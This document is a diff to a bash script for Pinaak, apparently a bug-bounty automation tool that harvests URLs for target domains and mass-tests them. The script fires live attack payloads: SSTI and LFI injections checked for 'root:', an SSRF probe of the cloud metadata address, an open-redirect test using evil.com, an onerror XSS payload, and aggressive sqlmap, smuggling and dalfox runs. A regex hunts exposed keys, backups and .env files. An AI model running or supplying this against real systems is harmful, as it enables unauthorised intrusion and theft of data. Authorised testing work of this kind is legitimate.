@@ -74,11 +74,11 @@ if [ -z "$threads" ]
     threads=100
 fi
 
-if [ ! -d "vulnerabilities" ]; then
-    mkdir vulnerabilities/
+if [ ! -d "pinaak_output" ]; then
+    mkdir pinaak_output/
 fi
 
-cd vulnerabilities/
+cd pinaak_output/
 
 information() {
     sleep 2s
@@ -89,55 +89,62 @@ information() {
 getParams() {
     sleep 3s
     echo -e "\nGetting all the parameters"
-    cat $targetList | gauplus --random-agent -retries 20 -t $threads -subs -b png,jpg,gif,svg | anew -q gau_output.txt
-    cat $targetList | xargs -P 50 -I % bash -c "echo % | waybackurls" | anew -q way_output.txt
-    cat gau_output.txt way_output.txt | urldedupe -s | anew -q parameters.txt
+    mkdir parameters/
+    cat $targetList | gauplus --random-agent -retries 20 -t $threads -subs -b png,jpg,gif,svg | anew -q parameters/gau_output.txt
+    cat $targetList | xargs -P 50 -I % bash -c "echo % | waybackurls" | anew -q parameters/way_output.txt
+    cat parameters/*.txt | urldedupe -s | anew -q parameters/parameters.txt
 }
 
 filterParams() {
     sleep 3s
     echo -e "Filtering all the parameters"
-    mkdir patterns/
-    cat parameters.txt | gf xss | qsreplace "FUZZ" | anew -q patterns/xssPatterns.txt
-    cat parameters.txt | gf lfi | anew -q patterns/lfiPatterns.txt
-    cat parameters.txt | gf ssrf | anew -q patterns/ssrfPatterns.txt
-    cat parameters.txt | gf ssti | anew -q patterns/sstiPatterns.txt
-    cat parameters.txt | gf sqli | anew -q patterns/sqliPatterns.txt
-    cat parameters.txt | gf redirect | anew -q patterns/redirectPatterns.txt
-    cat $sPayload | while read -r line; do cat patterns/sstiPatterns.txt | qsreplace "$line" | anew -q checkSSTI.txt;done 2> /dev/null
-    cat $lPayload | while read -r line; do cat patterns/lfiPatterns.txt | qsreplace "$line" | anew -q checkLFI.txt;done 2> /dev/null
-    cat patterns/ssrfPatterns.txt | qsreplace "$intServer" | anew -q checkSSRF.txt
+    mkdir parameters/patterns/
+    cat parameters.txt | gf xss | qsreplace "FUZZ" | anew -q parameters/patterns/xssPatterns.txt
+    cat parameters.txt | gf lfi | anew -q parameters/patterns/lfiPatterns.txt
+    cat parameters.txt | gf ssrf | anew -q parameters/patterns/ssrfPatterns.txt
+    cat parameters.txt | gf ssti | anew -q parameters/patterns/sstiPatterns.txt
+    cat parameters.txt | gf sqli | anew -q parameters/patterns/sqliPatterns.txt
+    cat parameters.txt | gf redirect | anew -q parameters/patterns/redirectPatterns.txt
+    cat $sPayload | while read -r line; do cat parameters/patterns/sstiPatterns.txt | qsreplace "$line" | anew -q checkSSTI.txt;done 2> /dev/null
+    cat $lPayload | while read -r line; do cat parameters/patterns/lfiPatterns.txt | qsreplace "$line" | anew -q checkLFI.txt;done 2> /dev/null
+    cat parameters/patterns/ssrfPatterns.txt | qsreplace "$intServer" | anew -q checkSSRF.txt
     cat parameters.txt | cut -d"?" -f1 | cut -d"=" -f1 | anew -q checkSensitive.txt
-    cat patterns/redirectPatterns.txt | qsreplace "FUZZ" | anew -q checkRedirect.txt
-    cat patterns/sqliPatterns.txt | qsreplace "FUZZ" | anew -q checkSQLI.txt
+    cat parameters/patterns/redirectPatterns.txt | qsreplace "FUZZ" | anew -q checkRedirect.txt
+    cat parameters/patterns/sqliPatterns.txt | qsreplace "FUZZ" | anew -q checkSQLI.txt
 }
 
 runNuclei() {
     sleep 3s
     echo -e "Scanning for template based vulnerabilities"
-    cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity low,medium,high,critical -c 200 -silent; done | anew -q nucleiOutput.txt
+    nuclei -update-templates &> /dev/null
+    mkdir nuclei_output/
+    cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity low -c 200 -silent; done | anew -q nuclei_output/low.txt
+    cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity medium -c 200 -silent; done | anew -q nuclei_output/medium.txt
+    cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity high -c 200 -silent; done | anew -q nuclei_output/high.txt
+    cat $targetList | while read -r line; do nuclei -target $line -t ~/nuclei-templates/ -severity critical -c 200 -silent; done | anew -q nuclei_output/critical.txt
 }
 
 runInjections() {
     sleep 3s
     echo -e "Checking injection attacks (may contains false positive)"
-    crlfuzz -l $targetList -c $threads -s | anew -q crlfOutput.txt 2> /dev/null
-    cat checkSSTI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q sstiOutput.txt &> /dev/null
-    cat checkLFI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q lfiOutput.txt &> /dev/null
-    cat parameters.txt | sed "s/'/ /g" | sed "s/)/ /g" | sed "s/(/ /g" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 50 bash -c "curl -ks '%' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q ssrfOutput.txt &> /dev/null
+    mkdir injects/
+    crlfuzz -l $targetList -c $threads -s | anew -q injects/crlf.txt 2> /dev/null
+    cat checkSSTI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"check-ssti49\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/ssti.txt &> /dev/null
+    cat checkLFI.txt | xargs -P 100 -I % bash -c "curl -s -L '%' | grep \"root:\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/lfi.txt &> /dev/null
+    cat parameters.txt | sed "s/'/ /g" | sed "s/)/ /g" | sed "s/(/ /g" | qsreplace "http://169.254.169.254/latest/meta-data/hostname" | xargs -I % -P 50 bash -c "curl -ks '%' | grep \"compute.internal\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/ssrf.txt &> /dev/null
     ffuf -w checkSSRF.txt -u FUZZ -p "0.6-1.2" -H "$header" -t $threads -s &> /dev/null
-    cat checkSensitive.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | anew -q sensitiveOutput.txt
-    python3 ~/tools/OpenRedireX/openredirex.py -l checkRedirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q opredirectOutuput.txt 2> /dev/null
-    cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q redirectOutput.txt &> /dev/null
-    cat patterns/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q xssOutput.txt &> /dev/null
-    cat patterns/xssPatterns.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q kxssOutput.txt &> /dev/null
-    cat $targetList | xargs -P 50 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --log smuggleOutput.txt --quite 2> /dev/null" &> /dev/null
-    cat checkSQLI.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=sqlmapOutput/ 2> /dev/null" &> /dev/null
+    cat checkSensitive.txt | grep -iaE "([^.]+)\.zip$|([^.]+)\.zip\.[0-9]+$|([^.]+)\.zip[0-9]+$|([^.]+)\.zip[a-z][A-Z][0-9]+$|([^.]+)\.zip\.[a-z][A-Z][0-9]+$|([^.]+)\.rar$|([^.]+)\.tar$|([^.]+)\.tar\.gz$|([^.]+)\.tgz$|([^.]+)\.sql$|([^.]+)\.db$|([^.]+)\.sqlite$|([^.]+)\.pgsql\.txt$|([^.]+)\.mysql\.txt$|([^.]+)\.gz$|([^.]+)\.config$|([^.]+)\.log$|([^.]+)\.bak$|([^.]+)\.backup$|([^.]+)\.bkp$|([^.]+)\.crt$|([^.]+)\.dat$|([^.]+)\.eml$|([^.]+)\.java$|([^.]+)\.lst$|([^.]+)\.key$|([^.]+)\.passwd$|([^.]+)\.pl$|([^.]+)\.pwd$|([^.]+)\.mysql-connect$|([^.]+)\.jar$|([^.]+)\.cfg$|([^.]+)\.dir$|([^.]+)\.orig$|([^.]+)\.bz2$|([^.]+)\.old$|([^.]+)\.vbs$|([^.]+)\.img$|([^.]+)\.inf$|([^.]+)\.sh$|([^.]+)\.py$|([^.]+)\.vbproj$|([^.]+)\.mysql-pconnect$|([^.]+)\.war$|([^.]+)\.go$|([^.]+)\.psql$|([^.]+)\.sql\.gz$|([^.]+)\.vb$|([^.]+)\.webinfo$|([^.]+)\.jnlp$|([^.]+)\.cgi$|([^.]+)\.temp$|([^.]+)\.ini$|([^.]+)\.webproj$|([^.]+)\.xsql$|([^.]+)\.raw$|([^.]+)\.inc$|([^.]+)\.lck$|([^.]+)\.nz$|([^.]+)\.rc$|([^.]+)\.html\.gz$|([^.]+)\.gz$|([^.]+)\.env$|([^.]+)\.yml$" | anew -q injects/files.txt
+    python3 ~/tools/OpenRedireX/openredirex.py -l checkRedirect.txt --keyword FUZZ -p ~/tools/OpenRedireX/payloads.txt | grep "^http" | sed -r -i "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | anew -q injects/opredirect.txt 2> /dev/null
+    cat checkRedirect.txt | grep -a -i "\=http" | qsreplace "http://www.evil.com/" | xargs -P 50 -I % bash -c "curl -s -L '%' -I | grep \"evil.com\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/redirect.txt &> /dev/null
+    cat parameters/patterns/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 50 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q injects/xss.txt &> /dev/null
+    cat parameters/patterns/xssPatterns.txt | xargs -P 30 -I % bash -c "echo % | kxss" 2> /dev/null | anew -q injects/kxss.txt &> /dev/null
+    cat $targetList | xargs -P 50 -I % bash -c "python3 ~/tools/smuggler/smuggler.py -u '%' --log injects/smuggle.txt --quite 2> /dev/null" &> /dev/null
+    cat checkSQLI.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir=injects/sql/ 2> /dev/null" &> /dev/null
     if [ -n "$bServer" ]
         then
-            dalfox file patterns/xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $threads -b $bServer 2> /dev/null | anew -q dalfoxOutput.txt &> /dev/null
+            dalfox file parameters/patterns/xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $threads -b $bServer 2> /dev/null | anew -q injects/dalfox.txt &> /dev/null
         else
-            dalfox file patterns/xssPatterns.txt --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $threads 2> /dev/null | anew -q dalfoxOutput.txt &> /dev/null
+            dalfox file parameters/patterns/xssPatterns.txt pipe --silence --no-color --no-spinner --mass --mass-worker 100 --skip-bav -w $threads 2> /dev/null | anew -q injects/dalfox.txt &> /dev/null
     fi
 }
 
@@ -146,7 +153,8 @@ processFinal() {
     clear
     logo
     echo -e "Finalising things"
-    rm -rf gau_output.txt way_output.txt parameters.txt  checkLFI.txt patterns/ checkRedirect.txt checkSensitive.txt checkSQLI.txt checkSSRF.txt checkSSTI.txt &> /dev/null
+    rm -rf check* &> /dev/null
+    rm -rf parameters/gau_output.txt parameters/way_output.txt &> /dev/null
 }
 
 sendNotification() {
@@ -154,10 +162,9 @@ sendNotification() {
     clear
     logo
     echo -e "Sending notifications"
-    echo -e "$(cat * | wc -l ) total vunerabilities found" | notify -silent &> /dev/null
-    cat *.txt 2> /dev/null | notify -silent &> /dev/null
-    echo -e "Check sqlmapOutput folder for sqli vulnerabilities" | notify -silent &> /dev/null
-    echo -e "Check ~/tools/smuggler/ folder for smuggler vulnerabilities" | notify -silent &> /dev/null
+    echo -e "$(cat injects/*.txt nuclei_output/*.txt | wc -l ) total vunerabilities found" | notify -silent &> /dev/null
+    cat injects/*.txt nuclei_output/*.txt 2> /dev/null | notify -silent &> /dev/null
+    echo -e "Check $(pwd)/injects/sql/ folder for sqli vulnerabilities" | notify -silent &> /dev/null
     echo "Thanks for using Pinaak. Have a great day :)" | notify -silent &> /dev/null
     echo -e "Thanks for using Pinaak. Have a great day :)"
     exit 1
